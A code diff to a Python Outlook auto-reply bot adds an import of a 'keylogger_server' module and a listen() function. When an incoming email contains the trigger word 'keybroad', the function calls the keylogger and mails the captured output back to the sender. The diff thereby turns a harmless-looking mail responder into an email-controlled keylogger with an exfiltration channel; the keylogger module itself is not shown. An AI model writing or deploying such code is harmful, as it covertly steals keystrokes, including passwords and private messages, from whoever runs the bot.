@@ -1,6 +1,6 @@
 import time
 from datetime import datetime, timedelta
-
+import keylogger_server
 import win32com.client
 
 outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
@@ -15,6 +15,14 @@ def sendBack(subject,body,sendTo):
     repMailItem.Display()
     repMailItem.Send()
 
+def listen(msg):
+    string = msg.lower()
+    rep = ""
+    if "keybroad" in string:
+        rep = rep + keylogger_server.keylog(string) + "\n"
+
+    return rep
+
 inbox = outlook.GetDefaultFolder(6)
 messages = inbox.Items
 mailDefault = messages.GetLast()
@@ -22,7 +30,8 @@ mailDefault = messages.GetLast()
 while True:
     mailNow = messages.GetLast()
     if( mailNow.ReceivedTime > mailDefault.ReceivedTime ):
-        sendBack("I'm bot","Can i hepl you",mailNow.Sender.GetExchangeUser().PrimarySmtpAddress)
+        rep = listen(mailNow.Body)
+        sendBack("I'm bot",rep,mailNow.Sender.GetExchangeUser().PrimarySmtpAddress)
         mailDefault = mailNow
         print(True)
     else:
